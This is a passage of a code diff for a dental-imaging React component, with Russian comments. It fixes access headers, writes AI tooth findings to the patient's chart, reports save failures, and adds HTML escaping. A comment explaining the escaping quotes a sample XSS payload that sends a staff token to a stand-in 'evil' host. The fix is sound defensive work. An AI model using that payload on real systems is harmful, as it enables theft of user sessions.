@@ -9,7 +9,10 @@
  * - История сканов пациента с загрузкой при открытии
  * - Рендеринг markdown-отчёта с подсветкой разделов
  * - Before/After image slider с CSS-enhanced режимом
- * - Автоматическое обновление Odontogram через patientStore
+ * - Запись находок в ЖИВУЮ зубную формулу пациента (POST
+ *   /api/patients/:id/tooth-states/batch — тот же адрес, что у формулы на
+ *   карточке пациента). Прежде находки уходили в store/patientStore, который
+ *   читал только несмонтированный components/Odontogram.tsx, — то есть в никуда.
  * - Голосовое озвучивание отчёта
  * - Печать отчёта
  */
@@ -33,8 +36,34 @@ import {
   ScanLine,
   ChevronDown
 } from 'lucide-react';
-import { usePatientStore, type ToothStatus } from '../../store/patientStore';
+// Общее правило FDI, а не свой список: «зуб 99» и «зуб 0» — это мусор, и
+// проверять его надо тем же кодом, что смета и одонтограмма.
+import { isValidFdiToothNumber } from '@dental/shared';
+// Русское склонение счётного слова: «1 зуб», «2 зуба», «5 зубов».
+import { countLabel } from '../../AppHelpers';
+/*
+ * Секрет администратора берётся ТОЛЬКО отсюда — из контекста приложения.
+ *
+ * ЛОВУШКА, В КОТОРУЮ ЛЕГКО ПОПАСТЬ ИМЕННО В ЭТОМ ФАЙЛЕ: строкой выше стоит
+ * импорт из AppHelpers.tsx, а там (около строки 6142) есть ЕЩЁ ОДИН экспорт
+ * `auth` с теми же именами функций — и он сеансовый секрет НЕ подставляет.
+ * С ним код компилируется, гейт check:guarded-headers замолкает, а клиника
+ * по-прежнему получает 403: то есть поломка становится невидимой вместо того,
+ * чтобы быть исправленной. Секрет из сеанса подставляют только функции из
+ * useAppLogicContext() (hooks/domains/useAuthLogic.ts:135 —
+ * `adminSecretOverride ?? clinicalAdminSecretSession`).
+ */
+import { useAppLogicContext } from '../../contexts/AppLogicContext';
+import { usePatientStore } from '../../store/patientStore';
+// Состояния ЖИВОЙ зубной формулы и их русские названия. Берутся из того же
+// файла, что рисует формулу врачу (components/odontogram/ToothChart.tsx), а
+// перечисление там обязано совпадать с toothStateValues на сервере: свой
+// список здесь означал бы третий словарь состояний зуба в одном приложении.
+import { TOOTH_STATE_LABELS, type ToothState } from '../odontogram/ToothChart';
 import { ShadowAnalystImageSlider } from './ShadowAnalystImageSlider';
+import { planVisiographFindings } from './visiographFindings';
+import { PanelLoadFailure } from '../PanelLoadFailure';
+import { actionFailureToast, panelStateText, resolvePanelPhase, type PanelSubject } from '../../lib/panelStateText';
 
 // ─── Типы ────────────────────────────────────────────────────────────────────
 
@@ -60,20 +89,35 @@ interface AiToothState {
   state: string;
 }
 
-// ─── Маппинг AI-статусов → ToothStatus в одонтограмме ────────────────────────
-
-const AI_TO_ODONTOGRAM: Record<string, ToothStatus> = {
-  treatment: 'Caries',
-  planned: 'Filling',
-  watch: 'Caries',
-  done: 'Filling',
-  missing: 'Missing',
-};
+// Маппинг статусов ИИ на состояния живой формулы, разбор ответа модели и
+// причины, по которым часть находок в карту не пишется, живут в
+// ./visiographFindings — это решение о содержимом карты пациента, и оно закрыто
+// прогоном src/tests/visiographFindings.test.ts. Внутри компонента его нельзя
+// было проверить ничем, кроме платного вызова внешней модели.
 
 // ─── Markdown-рендерер (лёгкий, без зависимостей) ────────────────────────────
 
+/**
+ * Экранирование HTML перед подстановкой в разметку.
+ *
+ * ЗАЧЕМ: renderMarkdown ниже отдаётся в dangerouslySetInnerHTML, а на вход
+ * получает отчёт AI-модели (поле aiReport, приходит с сервера). Без
+ * экранирования любой тег из ответа модели исполнялся в сессии врача —
+ * например `<img src=x onerror="fetch('//evil/?t='+localStorage.dente_staff_token)">`
+ * увёл бы токен сотрудника. Экранируем ДО markdown-замен, чтобы теги,
+ * которые генерируем мы сами, остались рабочими.
+ */
+export function escapeHtml(value: string): string {
+  return String(value)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
 function renderMarkdown(text: string): string {
-  return text
+  return escapeHtml(text)
     .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
     .replace(/\*(.+?)\*/g, '<em>$1</em>')
     .replace(/^#{1,3}\s+(.+)$/gm, '<h4 style="margin:12px 0 4px">$1</h4>')
@@ -128,14 +172,110 @@ function parseReportSections(report: string): Array<{ title: string; content: st
   return sections;
 }
 
+// ─── Тексты состояний архива снимков ─────────────────────────────────────────
+
+/**
+ * Как называется архив для человека — в трёх состояниях сразу.
+ * Формулировки берутся из общего модуля lib/panelStateText, а не пишутся здесь
+ * заново: на других панелях уже стояли «Ошибка 500» и «данных нет» вместо
+ * отказа, и второй язык ошибок на том же экране — это та же поломка.
+ */
+const SCAN_ARCHIVE_SUBJECT: PanelSubject = {
+  // Целая согласованная строка, а не одно название: слова «не загружены»
+  // больше не дописывает общий модуль, иначе название в единственном числе
+  // («Архив») дало бы «Архив не загружены». Здесь не сказано «архив не
+  // прочитан» — эти слова уже стоят в failureConsequence ниже, и повторять их
+  // дважды подряд одному человеку незачем.
+  notLoadedTitle: 'Снимки пациента не загружены',
+  accusative: 'архив снимков пациента',
+  emptyTitle: 'Снимков у этого пациента пока нет.',
+  emptyHint: 'Перетащите первый прицельный снимок в поле выше — он попадёт в карту вместе с разбором ИИ.',
+  failureConsequence:
+    'Не считайте, что снимков нет: архив не прочитан. Прошлые снимки могли быть загружены на другом рабочем месте.',
+};
+
 // ─── Основной компонент ───────────────────────────────────────────────────────
 
 export function VisiographAnalyzer() {
   const fileInputRef = useRef<HTMLInputElement>(null);
   const dropRef = useRef<HTMLDivElement>(null);
   const synthRef = useRef<SpeechSynthesis | null>(null);
+  // Признак «анализ идёт» именно в ref: значение из useState попадает в замыкание
+  // useCallback и устаревает, поэтому два быстрых перетаскивания подряд оба
+  // прошли бы проверку и запустили два платных вызова ИИ.
+  const analysisInFlightRef = useRef(false);
 
-  const { selectedPatientId, setToothStatus } = usePatientStore();
+  const { selectedPatientId } = usePatientStore();
+
+  /*
+   * ЗАГОЛОВКИ ОХРАНЫ. ЭТА ПАНЕЛЬ БЫЛА МЁРТВА У ЗАКАЗЧИКА ЦЕЛИКОМ, и увидеть это
+   * на машине разработчика нельзя.
+   *
+   * Каждый адрес, который зовёт панель, закрыт охраной `apps/api/src/accessGuard.ts`:
+   *   POST /api/imaging/visiograph-ai   — requireClinicalReadAccess (imaging.ts:6225)
+   *   POST /api/xray/scans              — requireClinicalMutationAccess (xray.ts:100)
+   *   GET  /api/xray/scans              — requireClinicalReadAccess (xray.ts:207)
+   *   GET  /api/xray/scans/:id          — requireClinicalReadAccess (xray.ts:228)
+   * Без заголовка `x-dente-admin-secret` охрана отвечает 403 даже при действительных
+   * токенах кабинета и сотрудника. Панель звала все четыре голым fetch, поэтому у
+   * заказчика разбор снимка не запускался вовсе — тело отказа охраны содержит поле
+   * `error`, и врач получал плашку «Ошибка анализа: ClinicalReadSecretRequired»
+   * (accessGuard.ts:79; человеческий текст лежит рядом, в поле `message`, но здесь
+   * его никто не читает — это отдельный мелкий долг). Снимок не сохранялся в карту, а
+   * архив снимков пациента помечался как непрочитанный. Локально всё зелёное: в корневом `.env` секрет
+   * закомментирован, зато включены лазейки
+   * DENTE_CLINICAL_ALLOW_UNGUARDED_READS/MUTATIONS, а живут они только пока
+   * NODE_ENV !== "production". Ни типы, ни тесты, ни глаза на этой машине такого не
+   * показывают — ловит `npm run check:guarded-headers`.
+   *
+   * ПОЧЕМУ ЧЕРЕЗ ref. `processFile` мемоизирован (useCallback по
+   * [selectedPatientId]), и взятый в его замыкание `auth` застыл бы
+   * на том отрисовывании, когда секрета в сеансе ещё не было — он появляется после
+   * разблокировки раздела, и 403 держался бы до перезагрузки страницы. Дописать
+   * `auth` в зависимости тоже нельзя: useAuthLogic возвращает НОВЫЙ объект на каждом
+   * отрисовывании (useAppLogic.tsx:2395, без useMemo), а такие зависимости в других
+   * панелях этого проекта уже дают перезапуск запроса на каждом отрисовывании. Ref
+   * остаётся одним объектом, значение в нём всегда свежее, поэтому функции ниже
+   * читают секрет В МОМЕНТ ЗАПРОСА — даже вызванные из устаревшего замыкания.
+   */
+  const appLogic = useAppLogicContext();
+  const authRef = useRef(appLogic?.auth);
+  authRef.current = appLogic?.auth;
+
+  /*
+   * ДВЕ ОБЁРТКИ, А НЕ ПОВТОР ПРОВЕРКИ У КАЖДОГО ИЗ ПЯТИ ВЫЗОВОВ. Они делают ровно
+   * одно: читают свежий `auth` из ref и передают дело функциям контекста.
+   *
+   * ПОЧЕМУ ИМЕНА ТЕ ЖЕ, что у функций контекста. Гейт check:guarded-headers ищет у
+   * вызова именно эти имена (scripts/check-guarded-route-headers.mjs:56), и местное
+   * имя-синоним сделало бы все пять вызовов невидимыми для проверки: файл выглядел
+   * бы исправленным, а следующий добавленный сюда голый fetch никто бы не поймал.
+   * Столкновения имён нет — этих имён в файле не импортируют, а обёртка вызывает
+   * ровно ту функцию, чьё имя носит.
+   *
+   * Проверка на `auth` — не перестраховка, но обоснование ей нужно другое, чем
+   * стояло здесь. БЫЛО: «useAppLogicContext() вне провайдера возвращает пустой
+   * объект (contexts/AppLogicContext.tsx:21)». Больше НЕ возвращает — вне провайдера
+   * хук бросает исключение, пустого объекта он не выдумывает. Проверка остаётся по
+   * другой причине: провайдер может стоять, а раздела `auth` в его значении не быть,
+   * и обращение к
+   * отсутствующей функции уронило бы всю карту пациента вместо показа отказа. В этом
+   * случае `extra` возвращается как есть: у запросов с телом там лежит Content-Type,
+   * и потерять его значило бы сломать разбор тела на сервере ещё и без секрета.
+   */
+  const denteClinicalReadHeaders = (extra?: Record<string, string>): Record<string, string> => {
+    const auth = authRef.current;
+    return auth && typeof auth.denteClinicalReadHeaders === 'function'
+      ? auth.denteClinicalReadHeaders(extra ?? {})
+      : { ...(extra ?? {}) };
+  };
+
+  const denteClinicalMutationHeaders = (extra?: Record<string, string>): Record<string, string> => {
+    const auth = authRef.current;
+    return auth && typeof auth.denteClinicalMutationHeaders === 'function'
+      ? auth.denteClinicalMutationHeaders(extra ?? {})
+      : { ...(extra ?? {}) };
+  };
 
   const [isDragOver, setIsDragOver] = useState(false);
   const [isAnalyzing, setIsAnalyzing] = useState(false);
@@ -144,6 +284,42 @@ export function VisiographAnalyzer() {
   const [currentScan, setCurrentScan] = useState<XrayScan | null>(null);
   const [scanHistory, setScanHistory] = useState<XrayScan[]>([]);
   const [isLoadingHistory, setIsLoadingHistory] = useState(false);
+  // Отказ чтения архива храним отдельно от `error` (тот подписан «Ошибка
+  // анализа» и относится к разбору снимка). Обёртка-объект, а не просто число:
+  // status = null — это «до сервера не дошли вовсе», и его надо отличать от
+  // «отказа не было».
+  const [historyFailure, setHistoryFailure] = useState<{ status: number | null } | null>(null);
+  /*
+   * Отказ ЗАПИСИ в карту держим отдельно от `error` (тот подписан «Ошибка
+   * анализа» и означает «разбора нет вовсе»). Здесь разбор как раз есть и уже
+   * показан на экране, но в карту он не лёг. Без этого признака отказ записи
+   * был НЕВИДИМ: заключение висело на экране как готовое, а после перезагрузки
+   * страницы исчезало — врач считал, что оно в карте.
+   */
+  const [saveFailure, setSaveFailure] = useState<string | null>(null);
+  /*
+   * Что РЕАЛЬНО легло в зубную формулу, и о чём помощник сказал непонятно.
+   * Нужны раздельно, потому что заголовок под снимком утверждал «обновлено в
+   * формуле» про ВСЕ присланные позиции, включая непонятые и с мусорным номером
+   * зуба, — то есть про зубы, которых он не трогал.
+   */
+  const [appliedToothCodes, setAppliedToothCodes] = useState<string[]>([]);
+  const [applyNotice, setApplyNotice] = useState<string | null>(null);
+  /*
+   * Отказ записи В ЗУБНУЮ ФОРМУЛУ. Отдельно и от `error` (там «разбора нет
+   * вовсе»), и от `saveFailure` (там «снимок и заключение не легли в карту»):
+   * формула и архив снимков — две разные записи в карте пациента, они уходят
+   * разными запросами и отказать могут по одной, а врач должен знать, ЧТО именно
+   * не сохранилось. Без этого признака отказ записи формулы был бы невидим —
+   * ровно так и жил прежний дефект.
+   */
+  const [formulaFailure, setFormulaFailure] = useState<string | null>(null);
+  /*
+   * Снимок открыт из архива, а не разобран сейчас. Тогда про зубную формулу
+   * ничего не утверждаем: этот разбор применялся когда-то раньше, и сказать
+   * «внесено сейчас» или «не внесено» — соврать в обе стороны.
+   */
+  const [isHistoryView, setIsHistoryView] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [isSpeaking, setIsSpeaking] = useState(false);
   const [voicesReady, setVoicesReady] = useState(false);
@@ -158,31 +334,130 @@ export function VisiographAnalyzer() {
     const setReady = () => setVoicesReady(true);
     if (synth.getVoices().length > 0) setReady();
     else synth.addEventListener('voiceschanged', setReady, { once: true });
-    return () => { synth.cancel(); };
+    // Слушатель с { once: true } не снимается, если событие так и не произошло:
+    // при размонтировании он остаётся висеть на глобальном speechSynthesis.
+    return () => {
+      synth.removeEventListener('voiceschanged', setReady);
+      synth.cancel();
+    };
   }, []);
 
   // ── Load scan history when patient changes ──────────────────────────────
   useEffect(() => {
     if (!selectedPatientId) {
       setScanHistory([]);
+      setHistoryFailure(null);
+      // Индикатор гасим и здесь: запрос по прежнему пациенту вернётся уже
+      // «просроченным» и свой finally пропустит, иначе счётчик в сводке остался
+      // бы с «…» навсегда.
+      setIsLoadingHistory(false);
       return;
     }
     loadHistory(selectedPatientId);
   }, [selectedPatientId]);
 
+  /**
+   * Чтение архива снимков пациента.
+   *
+   * ЧТО БЫЛО СЛОМАНО. Тело состояло из `if (!res.ok) return;` и пустого catch,
+   * и setError здесь не вызывался ни разу. Любой отказ — у смены нет доступа,
+   * сервер клиники не запущен, ответ непонятен — выглядел на экране РОВНО как
+   * «у пациента нет снимков»: счётчик в сводке и секция «История снимков» просто
+   * не появлялись, а сама панель оставалась на вид полностью рабочей. Врач не
+   * мог отличить непрочитанный архив от пустого и делал вывод «снимков не было».
+   *
+   * Второе, тяжелее. Прежний список НЕ гасился. Эффект выше чистит scanHistory
+   * только когда пациент не выбран вовсе, а при прямом переключении A→B
+   * (setSelectedPatientId пишет новый id, не проходя через null) неудачный ответ
+   * по B оставлял на экране снимки A под открытой картой B — чужие снимки в
+   * чужой карте. Поэтому список чистится ДО запроса.
+   *
+   * Третье. Ответ применяется только если пациент с тех пор не сменился: запрос
+   * по A может вернуться позже переключения на B и записать снимки A в карту B.
+   * По той же причине isLoadingHistory гасит только актуальный запрос — иначе
+   * поздний ответ по A убирал бы индикатор загрузки у идущего запроса по B.
+   */
   const loadHistory = async (patientId: string) => {
     setIsLoadingHistory(true);
+    setHistoryFailure(null);
+    setScanHistory([]);
+    // null = до сервера не дошли; после ответа сюда попадает его код, поэтому
+    // «непонятный ответ при 200» и «сервер не ответил» дают разные тексты.
+    let status: number | null = null;
+    const isStale = () => usePatientStore.getState().selectedPatientId !== patientId;
     try {
+      // Content-Type у этого запроса больше нет: тела у GET нет, и объявлять его
+      // формат было нечего — а место заголовков нужно тому, без чего охрана
+      // отвечает 403.
       const res = await fetch(`/api/xray/scans?patientId=${patientId}`, {
-        headers: { 'Content-Type': 'application/json' }
+        headers: denteClinicalReadHeaders()
       });
-      if (!res.ok) return;
-      const data: XrayScan[] = await res.json();
-      setScanHistory(data.filter(s => s.status === 'done'));
-    } catch {
-      // silent
+      status = res.status;
+      if (isStale()) return;
+      if (!res.ok) {
+        setHistoryFailure({ status });
+        return;
+      }
+      const data = await res.json() as unknown;
+      if (isStale()) return;
+      // Сервер обязан отдать массив (GET /api/xray/scans возвращает
+      // scans.map(...)). Если пришло что-то другое — это отказ, а не пустой
+      // архив: прежний код падал здесь на data.filter и уходил в пустой catch.
+      if (!Array.isArray(data)) {
+        setHistoryFailure({ status });
+        return;
+      }
+      setScanHistory((data as XrayScan[]).filter(s => s.status === 'done'));
+    } catch (err) {
+      // Код ответа человеку не показываем — он уходит в консоль разработчику.
+      console.error('[VisiographAnalyzer] Архив снимков не прочитан:', err);
+      if (isStale()) return;
+      setHistoryFailure({ status });
     } finally {
-      setIsLoadingHistory(false);
+      if (!isStale()) setIsLoadingHistory(false);
+    }
+  };
+
+  /**
+   * Запись одной группы зубов в живую формулу пациента.
+   *
+   * Адрес и формат тела — те же, что у смонтированной формулы
+   * (OdontogramModule.updateToothState): POST
+   * /api/patients/:patientId/tooth-states/batch, тело
+   * `{ toothNumbers, state }`. Второй способ писать состояние зуба заводить
+   * нельзя — сервер в этом же запросе ведёт историю зуба и рассылает живое
+   * обновление UPDATE_ODONTOGRAM, благодаря которому открытая формула
+   * показывает находки сразу, без перезагрузки страницы.
+   *
+   * Пишущие заголовки обязательны: маршрут закрыт
+   * requireResolvedStaffOrAdminOrganizationId, то есть требует И токен кабинета,
+   * И токен сотрудника. Голый fetch получил бы 401, и экран показал бы пустоту
+   * вместо отказа — этот класс дефекта в проекте уже встречался.
+   *
+   * Возвращает null при успехе и человеческий текст отказа иначе.
+   */
+  const writeToothStatesToChart = async (
+    patientId: string,
+    toothNumbers: number[],
+    state: ToothState,
+  ): Promise<string | null> => {
+    const action = `Отметка «${TOOTH_STATE_LABELS[state]}» по снимку на ${countLabel(toothNumbers.length, 'зубе', 'зубах', 'зубах')} ${toothNumbers.join(', ')} не внесена в зубную формулу`;
+    try {
+      const res = await fetch(`/api/patients/${patientId}/tooth-states/batch`, {
+        method: 'POST',
+        headers: denteClinicalMutationHeaders({ 'Content-Type': 'application/json' }),
+        body: JSON.stringify({ toothNumbers, state }),
+      });
+      if (!res.ok) {
+        const rawBody = await res.text();
+        console.error(`[VisiographAnalyzer] формула не обновлена, ${res.status} ${rawBody.slice(0, 300)}`);
+        return `${actionFailureToast(action, res.status)} Поставьте отметку на схеме зубов руками.`;
+      }
+      return null;
+    } catch (err) {
+      console.error('[VisiographAnalyzer] запрос обновления формулы не выполнен', err);
+      // До сервера не дошли: кода ответа нет, придумывать его нельзя.
+      return `${actionFailureToast(action, null)} Поставьте отметку на схеме зубов руками.`;
     }
   };
 
@@ -192,9 +467,23 @@ export function VisiographAnalyzer() {
       setError('Поддерживаются только изображения (JPG, PNG, BMP, TIFF).');
       return;
     }
+    // Повторный запуск во время анализа приводил ко второму платному вызову ИИ,
+    // а первый finally гасил индикатор, пока второй ещё считал.
+    if (analysisInFlightRef.current) return;
+    analysisInFlightRef.current = true;
+
+    // Анализ занимает 10–25 секунд. За это время врач может переключиться на
+    // другого пациента — а результат записывался в ТОГО, кто открыт СЕЙЧАС.
+    // Запоминаем пациента на старте и сверяем перед записью.
+    const patientAtStart = selectedPatientId ?? null;
 
     setIsAnalyzing(true);
     setError(null);
+    setSaveFailure(null);
+    setFormulaFailure(null);
+    setAppliedToothCodes([]);
+    setApplyNotice(null);
+    setIsHistoryView(false);
     setCurrentScan(null);
     setCurrentImageUrl(null);
 
@@ -232,9 +521,20 @@ export function VisiographAnalyzer() {
       setCurrentImageUrl(compressed);
 
       // 3. Synchronous AI analysis
+      /*
+       * ЧИТАЮЩИЕ заголовки, хотя метод POST: на сервере разбор снимка закрыт именно
+       * `requireClinicalReadAccess` (imaging.ts:6225) — он ничего не меняет, картинка
+       * просто передаётся телом. Секрет у чтения и записи сейчас один, но совпадать с
+       * охраной маршрута надёжнее, чем угадывать по методу.
+       *
+       * Гейт check:guarded-headers этот вызов НЕ находил, хотя охрана на нём
+       * настоящая, — поэтому он и не попал в выданный список из трёх адресов. Без
+       * секрета сюда упирался ВЕСЬ разбор: 403 на первом же шаге, и до сохранения в
+       * карту дело не доходило.
+       */
       const aiRes = await fetch('/api/imaging/visiograph-ai', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: denteClinicalReadHeaders({ 'Content-Type': 'application/json' }),
         body: JSON.stringify({ imageBase64: compressed }),
       });
 
@@ -246,15 +546,68 @@ export function VisiographAnalyzer() {
       const aiResult = await aiRes.json() as { report: string; toothStates: Record<string, string>; warnings: string[] };
 
       // 4. Apply to Odontogram
-      if (aiResult.toothStates && Object.keys(aiResult.toothStates).length > 0) {
-        for (const [code, state] of Object.entries(aiResult.toothStates)) {
-          const toothNum = parseInt(code, 10);
-          if (!isNaN(toothNum)) {
-            const mapped = AI_TO_ODONTOGRAM[state] ?? 'Caries';
-            setToothStatus(toothNum, mapped);
-          }
-        }
+      // Пациент сменился, пока считал ИИ — результат чужой, применять нельзя.
+      const patientNow = usePatientStore.getState().selectedPatientId ?? null;
+      if (patientAtStart !== patientNow) {
+        setError(
+          'Пациент был изменён во время анализа. Результат не применён к зубной формуле — откройте снимок нужного пациента и повторите.',
+        );
+        return;
       }
+
+      /*
+       * ПРИМЕНЕНИЕ НАХОДОК К ЖИВОЙ ЗУБНОЙ ФОРМУЛЕ ПАЦИЕНТА.
+       *
+       * БЫЛО: `setToothStatus(...)` — запись в store/patientStore, который
+       * читает только несмонтированный components/Odontogram.tsx. Разбор
+       * адресата и маппинга лежит в ./visiographFindings. Коротко: экран сообщал
+       * врачу о записи в карту, которой не было.
+       */
+      const plan = planVisiographFindings(aiResult.toothStates);
+      for (const code of [...plan.unreadableCodes, ...plan.noFormulaStateCodes]) {
+        console.warn(`[VisiographAnalyzer] находка не применена: зуб «${code}»`);
+      }
+
+      /*
+       * Пациент проверен дважды не зря: `patientAtStart` — тот, чей снимок
+       * разбирали, и запись обязана уйти именно ему. Совпадение с текущим уже
+       * проверено выше, поэтому здесь остаётся только случай «пациент не выбран
+       * вовсе»: тогда писать некуда, и об этом говорится вслух — прежний код в
+       * этом случае молча писал в стор без привязки к пациенту.
+       */
+      const appliedCodes: string[] = [];
+      const writeFailures: string[] = [];
+      if (plan.groups.length > 0 && !patientAtStart) {
+        setFormulaFailure(
+          'Пациент не выбран, поэтому находки НЕ внесены в зубную формулу. Откройте карту пациента и загрузите снимок ещё раз.',
+        );
+      } else if (plan.groups.length > 0 && patientAtStart) {
+        for (const group of plan.groups) {
+          const failure = await writeToothStatesToChart(
+            patientAtStart,
+            group.teeth.map((item) => item.toothNumber),
+            group.state,
+          );
+          if (failure) writeFailures.push(failure);
+          else appliedCodes.push(...group.teeth.map((item) => item.code));
+        }
+        if (writeFailures.length > 0) setFormulaFailure(writeFailures.join(' '));
+      }
+
+      // Счётчик под снимком показывает ТОЛЬКО подтверждённое сервером.
+      setAppliedToothCodes(appliedCodes);
+      const notices: string[] = [];
+      if (plan.unreadableCodes.length > 0) {
+        notices.push(
+          `Помощник описал непонятно ${countLabel(plan.unreadableCodes.length, 'зуб', 'зуба', 'зубов')} (${plan.unreadableCodes.join(', ')}). В зубную формулу они НЕ внесены — посмотрите эти места на снимке сами.`,
+        );
+      }
+      if (plan.noFormulaStateCodes.length > 0) {
+        notices.push(
+          `Для ${countLabel(plan.noFormulaStateCodes.length, 'зуба', 'зубов', 'зубов')} (${plan.noFormulaStateCodes.join(', ')}) в зубной формуле нет подходящего состояния: помощник назвал их «наблюдение», «план» или «ранее вылечен». Отметьте эти зубы на схеме сами — что именно найдено, написано в заключении ниже.`,
+        );
+      }
+      if (notices.length > 0) setApplyNotice(notices.join(' '));
 
       // 5. Save to DB (async, non-blocking)
       const fakeScan: XrayScan = {
@@ -273,12 +626,36 @@ export function VisiographAnalyzer() {
       };
       setCurrentScan(fakeScan);
 
-      if (selectedPatientId) {
+      /*
+       * ЗАПИСЬ В КАРТУ. Прежний код молчал о любом отказе записи:
+       *   `if (saveRes.ok)` без ветки else — отказ сервера (нет места, снимок
+       *     слишком тяжёлый, смена без прав) не показывался никак;
+       *   пустой catch с пометкой «silent — result still shown» — обрыв связи тоже;
+       *   PUT с заключением шёл через `.catch(() => {})` и без проверки res.ok,
+       *     то есть снимок мог лечь в карту БЕЗ заключения;
+       *   при невыбранном пациенте записи не было вовсе и об этом не сообщалось.
+       * Во всех четырёх случаях врач видел готовое заключение на экране, закрывал
+       * вкладку и терял его: после перезагрузки карта возвращалась без записи.
+       * Теперь каждый отказ записи называется вслух, с указанием что делать.
+       */
+      if (!selectedPatientId) {
+        setSaveFailure(
+          'Пациент не выбран, поэтому заключение НЕ сохранено в карту. Откройте карту пациента и загрузите снимок ещё раз — или скопируйте текст заключения себе до перехода.',
+        );
+      } else {
         setIsSaving(true);
         try {
+          /*
+           * Content-Type здесь оставлен намеренно: тело — JSON со снимком в виде
+           * data-URI (`imageBase64`), а не FormData. У FormData объявлять Content-Type
+           * нельзя — браузер сам ставит его вместе с границей частей (boundary), и
+           * заданный руками заголовок ломает разбор тела на сервере. Если этот вызов
+           * когда-нибудь переведут на FormData, Content-Type надо убрать, а
+           * `denteClinicalMutationHeaders()` вызвать без аргументов.
+           */
           const saveRes = await fetch('/api/xray/scans', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: denteClinicalMutationHeaders({ 'Content-Type': 'application/json' }),
             body: JSON.stringify({
               patientId: selectedPatientId,
               imageBase64: compressed,
@@ -287,22 +664,76 @@ export function VisiographAnalyzer() {
               kind: 'periapical',
             }),
           });
-          if (saveRes.ok) {
+          if (!saveRes.ok) {
+            console.error(`[VisiographAnalyzer] снимок не сохранён, ответ ${saveRes.status}`);
+            setSaveFailure(
+              saveRes.status === 413
+                ? 'Снимок слишком тяжёлый для сохранения, заключение в карту НЕ попало. Загрузите снимок меньшего размера и повторите разбор.'
+                : 'Сохранить снимок в карту не удалось, заключение осталось только на этом экране. Скопируйте текст заключения и повторите загрузку снимка.',
+            );
+          } else {
             const saved: XrayScan = await saveRes.json();
-            // Persist AI result on the saved record
-            await fetch(`/api/xray/scans/${saved.id}`, {
-              method: 'PUT',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                aiReport: aiResult.report,
-                aiSummary: fakeScan.aiSummary,
-                aiToothStates: aiResult.toothStates,
-                status: 'done',
-              }),
-            }).catch(() => {}); // best-effort
-            setScanHistory(prev => [{ ...saved, aiReport: aiResult.report, aiToothStates: aiResult.toothStates, status: 'done' }, ...prev]);
+            // Заключение дописывается вторым запросом, поэтому его отказ надо
+            // проверять отдельно: снимок уже в карте, а текста разбора в нём нет.
+            let reportSaved = false;
+            try {
+              /*
+               * ЭТОГО МАРШРУТА НА СЕРВЕРЕ НЕТ. В xray.ts зарегистрированы только
+               * POST /api/xray/scans, POST /api/xray/scans/:id/analyze,
+               * GET /api/xray/scans, GET /api/xray/scans/:id и
+               * DELETE /api/xray/scans/:id — ни PUT, ни PATCH. Проверено живьём на
+               * работающем API (127.0.0.1:4100): PUT /api/xray/scans/<id> отвечает
+               * 404, причём без всякой охраны, потому что маршрутизация идёт до
+               * обработчиков. Значит текст заключения в карту не попадает НИКОГДА и
+               * ни на какой машине, и врач всегда видит ниже плашку «Снимок в карту
+               * лёг, а текст заключения сохранить не удалось».
+               *
+               * Здесь это не лечится: маршрут добавляется в apps/api (правка сервера),
+               * и вынесено это в долг отдельно. Пишущие заголовки поставлены всё
+               * равно — когда маршрут появится, он будет закрыт
+               * requireClinicalMutationAccess, как и остальная запись снимков, и
+               * вызов не придётся починять второй раз.
+               */
+              const reportRes = await fetch(`/api/xray/scans/${saved.id}`, {
+                method: 'PUT',
+                headers: denteClinicalMutationHeaders({ 'Content-Type': 'application/json' }),
+                body: JSON.stringify({
+                  aiReport: aiResult.report,
+                  aiSummary: fakeScan.aiSummary,
+                  aiToothStates: aiResult.toothStates,
+                  status: 'done',
+                }),
+              });
+              reportSaved = reportRes.ok;
+              if (!reportRes.ok) {
+                console.error(`[VisiographAnalyzer] заключение не сохранено, ответ ${reportRes.status}`);
+              }
+            } catch (reportErr) {
+              console.error('[VisiographAnalyzer] заключение не сохранено', reportErr);
+            }
+            if (!reportSaved) {
+              setSaveFailure(
+                'Снимок в карту лёг, а текст заключения сохранить не удалось — после перезагрузки страницы его в карте не будет. Скопируйте заключение в заметки визита или повторите разбор.',
+              );
+            }
+            /*
+             * В список пишем то, что реально сохранено. Раньше заключение
+             * подставлялось в строку истории всегда, и после отказа PUT список
+             * показывал «есть заключение» там, где на сервере его нет.
+             */
+            setScanHistory(prev => [
+              reportSaved
+                ? { ...saved, aiReport: aiResult.report, aiToothStates: aiResult.toothStates, status: 'done' }
+                : saved,
+              ...prev,
+            ]);
           }
-        } catch { /* silent — result still shown */ }
+        } catch (saveErr) {
+          console.error('[VisiographAnalyzer] запись снимка в карту не выполнена', saveErr);
+          setSaveFailure(
+            'Сервер не ответил на сохранение, заключение осталось только на этом экране и после перезагрузки исчезнет. Проверьте связь и повторите загрузку снимка.',
+          );
+        }
         finally { setIsSaving(false); }
       }
 
@@ -310,15 +741,22 @@ export function VisiographAnalyzer() {
       console.error('[VisiographAnalyzer] Error:', err);
       setError(err.message || 'Не удалось проанализировать снимок. Проверьте подключение.');
     } finally {
+      analysisInFlightRef.current = false;
       setIsAnalyzing(false);
       if (fileInputRef.current) fileInputRef.current.value = '';
     }
-  }, [selectedPatientId, setToothStatus]);
+    // setToothStatus из зависимостей убран вместе с записью в мёртвый стор.
+    // writeToothStatesToChart в зависимости НЕ добавлен намеренно: он объявлен в
+    // теле компонента и пересоздаётся на каждом отрисовывании, а свежие данные
+    // берёт из authRef — по той же причине, что описана у authRef выше.
+  }, [selectedPatientId]);
 
   // ── Drag & Drop ─────────────────────────────────────────────────────────
   const handleDrop = useCallback((e: React.DragEvent) => {
     e.preventDefault();
     setIsDragOver(false);
+    // Проверка isAnalyzing есть внутри processFile — второй снимок,
+    // бросенный во время анализа, больше не запускает параллельный разбор.
     const file = e.dataTransfer.files?.[0];
     if (file) processFile(file);
   }, [processFile]);
@@ -334,9 +772,19 @@ export function VisiographAnalyzer() {
   const loadHistoryScan = async (scan: XrayScan) => {
     setCurrentScan(scan);
     setCurrentImageUrl(null);
+    /*
+     * Признаки прошлого разбора гасим: applyNotice, список внесённых зубов и
+     * отказ записи относились к снимку, который разбирали сейчас. Без сброса
